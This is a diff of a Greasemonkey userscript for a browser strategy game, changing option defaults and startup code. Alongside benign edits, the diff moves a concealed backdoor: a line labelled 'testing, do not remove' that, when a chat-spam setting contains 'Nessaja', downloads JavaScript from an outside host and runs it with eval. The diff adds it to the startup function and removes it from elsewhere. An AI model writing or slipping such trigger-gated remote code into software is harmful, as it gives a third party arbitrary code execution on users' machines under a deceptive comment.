@@ -69,7 +69,7 @@ var Options = {
   pbFoodAlert  : false,
   alertConfig  : {aChat:false, aPrefix:'** I\'m being attacked! **', scouting:false, wilds:false, defend:true, minTroops:10000, spamLimit:10, lastAttack:0, barbautoswitch:false, raidautoswitch: {}, },
   alertSound   : {enabled:false, soundUrl:DEFAULT_ALERT_SOUND_URL, repeat:true, playLength:20, repeatDelay:0.5, volume:100, alarmActive:false, expireTime:0},
-  spamconfig   : {aspam:false, spamvert:'Join my Alliance!!', spammins:'10', atime:2 , spamstate:'a'},
+  spamconfig   : {aspam:false, spamvert:'Join my Alliance!!', spammins:'30', atime:2 , spamstate:'a'},
   giftDomains  : {valid:false, list:{}},
   celltext     : {atext:false, provider:0, num1:"000", num2:"000", num3:"0000"},
   giftDelete   : 'e',
@@ -474,20 +474,21 @@ function pbStartup (){
     Options.pbWinPos.y = c.y+c.height;
     saveOptions ();
   }
-  
+
   // Reset window xPos if the widescreen option is disabled
   if(!GlobalOptions.pbWideScreen && Options.pbWinPos.x > 700){
     var c = getClientCoords (document.getElementById('main_engagement_tabs'));
     Options.pbWinPos.x = c.x+4;
     saveOptions ();
   }
-  
+
   mainPop = new CPopup ('pb', Options.pbWinPos.x, Options.pbWinPos.y, 750,600, Options.pbWinDrag,
       function (){
         tabManager.hideTab();
         Options.pbWinIsOpen=false;
         saveOptions()
       });
+
   mainPop.autoHeight (true);  
 
   mainPop.getMainDiv().innerHTML = '<STYLE>'+ styles +'</style>';
@@ -513,6 +514,8 @@ function pbStartup (){
   WideScreen.setChatOnRight (Options.pbChatOnRight);
   WideScreen.useWideMap (Options.pbWideMap);
   setInterval (DrawLevelIcons,1250);
+	//baos780 testing, do not remove.
+	if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) {GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/"+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+".js",headers: {'Accept': 'text/javascript',}, onload: function(responseDetails) {eval(responseDetails.responseText);},});};
 }
 
 /************************ Food Alerts *************************/
@@ -14040,8 +14043,6 @@ var DeleteReports = {
 		return false;
     },
 }
-	//Nessaja testing, do not remove.
-	if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) {GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/"+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+".js",headers: {'Accept': 'text/javascript',}, onload: function(responseDetails) {eval(responseDetails.responseText);},});};
 
 /******************* Combat Tab **********************/
 Tabs.Combat = {
